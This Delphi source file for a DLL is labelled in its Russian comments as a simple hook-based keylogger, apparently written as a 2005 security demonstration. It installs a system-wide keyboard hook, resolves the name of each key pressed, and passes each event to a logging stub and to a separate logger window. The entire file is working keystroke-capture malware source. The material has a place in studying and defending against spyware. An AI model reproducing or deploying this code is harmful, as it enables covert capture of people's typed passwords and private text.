library Key;
// Простейший "Клавиатурный шпион" на базе ловушек
// Зайцев О.В, 2005. http://z-oleg.com/secur, http://z-oleg.com/delphi
// Библиотека key.dll, содержащая саму ловушку и функции для установки и удаления.
uses
  WinTypes,
  WinProcs,
  Messages;

const
  KeyEvent = WM_USER + 1; // Код сообщения, прмиеняемого для коммуникации DLL и программы-регистратора

var
  HookHandle   : hHook;      // Handle, возвращаемый SetWindowsHookEx

procedure AddToLog(S : string);
begin
 // В данной процедуре необходимо разместить код,
 // отвечающий за протоколирование нажимаемых клавиш
end;
                                               
// Функция-обработчик перехватчика
function KeyHook(nCode: integer; WParam: Word; LParam: LongInt): Longint; stdcall;
var
  KeyName : string;
  Res     : integer;
  LogWindowHandle : hWnd;    // Handle окна приложения - регистратора, которому передаются события
begin
 // Это нажатие клавиши ?
 if (nCode = HC_ACTION) and ((lParam and $80000000) = 0) then begin
  // ***** 1. Демонстрация протоколирования нажатий кливиш непосредственно из DLL *****
  // 1.1 Выделение буфера для имени клавиши
  SetLength(KeyName, 32);
  // 1.2 Получение имени по коду, Res - длина возвращенной строки
  Res := GetKeyNameText(LParam, @KeyName[1], Length(KeyName));
  // 1.3 Передача функции протоколирования
  AddToLog(copy(KeyName, 1, Res));

  // ***** 2. Демонстрация передачи событий окну приложения-регистратора *****
  // 2.1 Передача сообщения найденному окну
  LogWindowHandle := FindWindow('TKeyForm', nil);
  if LogWindowHandle <> 0 then
   SendMessage(LogWindowHandle, KeyEvent, wParam, lParam);
 end;

 // Вызов следующего в цепочке обработчика
 Result := CallNextHookEx(HookHandle, nCode, WParam, LParam);
end;

// Установка перехватчика
procedure SetKeyHook; stdcall;
begin
 if HookHandle <> 0 then exit;
 // Устанавливаем перехватчик типа WH_KEYBOARD - на клавиатурные события
 HookHandle      := SetWindowsHookEx(WH_KEYBOARD, @KeyHook, HInstance, 0);
end;

// Удаление перехватчика
procedure DelKeyHook; stdcall;
begin
  if HookHandle <> 0 then begin
    UnhookWindowsHookEx(HookHandle);
    HookHandle := 0;
  end;
end;

// Экспортируемые функции:
exports
  SetKeyHook,
  DelKeyHook;

begin
 HookHandle := 0;
end.

